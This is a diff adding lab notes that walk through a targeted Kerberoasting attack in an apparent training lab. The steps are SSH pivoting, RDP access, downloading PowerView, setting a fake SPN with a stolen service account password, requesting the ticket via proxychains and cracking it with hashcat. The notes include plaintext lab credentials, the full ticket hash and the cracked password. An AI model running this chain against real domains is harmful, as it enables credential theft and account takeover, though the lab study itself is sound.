@@ -49,3 +49,24 @@ Question 1 -  Set a fake SPN on the ttimmons user. Kerberoast this user and crac
 1) ssh -D 9050 -i rootkey -L 1337:172.16.8.20:3389 root@10.129.200.168
 2) second ssh 9050 -> ssh -D 9050 -i rootkey root@10.129.200.168.
 3)  xfreerdp /v:127.0.0.1:1337 /u:hporter /p:Gr8hambino! /drive:shared,/home/htb-ac-1235531/Desktop
+4) ON KALI: wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+5) ON HPORTER CLI :
+cd C:\Share
+net use
+6) Output: \\TSCLIENT\shared 
+7) copy \\TSCLIENT\shared\PowerView.ps1
+8) pwoershell -> enter this on the CLI 
+9) Import-Module .\PowerView.ps1 
+10)
+$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
+Set-DomainObject -credential \$Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
+11) on kali -> sudo su -> proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
+
+proxychains output: 
+
+$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$cacf2fb732a56e14c845cf3cd993da18$464d390dd622bbcb6c01e5f6fc23c3980b13850cfdb4f89dc6e6e0ee2a3e39fa9cb39d3a0ccfcafab137302c44a54e76dbe278f55e271074fc045cdd6973128c7aa3b23850ce307d95f425daf9f8a0b19d5bb1f035daa2671fb4c655d8ac8f662788c07ffce9d07f1e3cfd0d7d7daae4761f566f45e112f8c3985be409a5e613fd659adfb2cb2f8c71f35ba0836666d8c93a4005aaddebdebd87d6bfe967101f0191bb825433a9d953432815c5324a8966a0d3522d903bd88cb087c3046479864ad74ced12587a8c8f1e26332db08599000596ec2bbbe6e0302c781477d407ce8a6f612d2ade7af4c5dcf96341c04aa957eb322735920d50f3c32f4464539849a22f6a725648824d5f1a9b29f154974704d3f2bf70effce1f5cd0c9a27b77e64330466a72153485573bb4cffa067dedc6442ffc12e016f84e2ba2d93ceedf5b58a5574bbf393bbbef7f198cb2fedbb3a3a729f4a84485a659c701a37b846a79aaa604d353c76faf7d1cd630225bc47a5c38e27d06ac579357ae950f10626dc98309a1a09ec8c33c88e22cf4815a60ef2ff807b2bd4226521fb2829c1787d02db1cc64e3d99f26d28acc980117afcbc49f561ca8eac6423036d5abae29449e3caf653af146c58337208c93edf12e02165213083fcd321acdeddeab3f61db8d9831c1890bce207d0e48b32fe856f34fa57c339df57e411f63b7f65b8d3067a8169c0fed1fb60df6a15d7f46f18623411f608960f5ec906b34654e976c7449521a08249ef608c3d5c268f62bdbb39a39b58852b59b43635d8cad6900dedf7d051bd060a42b350b32a89111f70212d377e4b6282372cafde3bfdd7b016ee4203e537281180decfc1a7f2e3caa0d6e984af4697b79900c5ce33d1a4d3c9a84eb901ff8366d11eb01848a15aa028477d76443fb972ad3b30f9e3271db91476ae237498ba88aea19e3a24b6d48795f2d5f81f0e17c7ac976ab506b894e95968de006c125c893bbf1ab4e4637b2cd636afa6e9864c3321086a1051fb270bbb7bdf89b28e1ec1444b3d1be028198bd1a18ed523c3a6dbcf86f3c45764152a90a97bcaeb3883d25234ed598c55d7442cf1978426e37180a976b347cf5ea576b9454a3151b6a19394a3670cb38e9b9b873b183259371b41c88f150c3477d0adb18d103e1f8ce9dabc387b0784cecd67acbf65fa8670e1d05bb4251985b5204e891d76753b5a76485d9dc2efa08d3e44713fae56252a0e5ed521fafc9bdfe5ebabc1113a7c91dd9da2ad67ba2208630849c6130930e81f48aa036a378c08c849d718aeac7ec91d20a0dff07286a9f8361ef90f6826e0818ce64c7c1ef8068e94c3d4ab28277475a6ffbe
+
+12) copy has into file on KALI -> i named it ttimmons ->
+13) hashcat -m 13100 -O -w 3 ttimmons /usr/share/wordlists/rockyou.txt 
+output: Repeat09
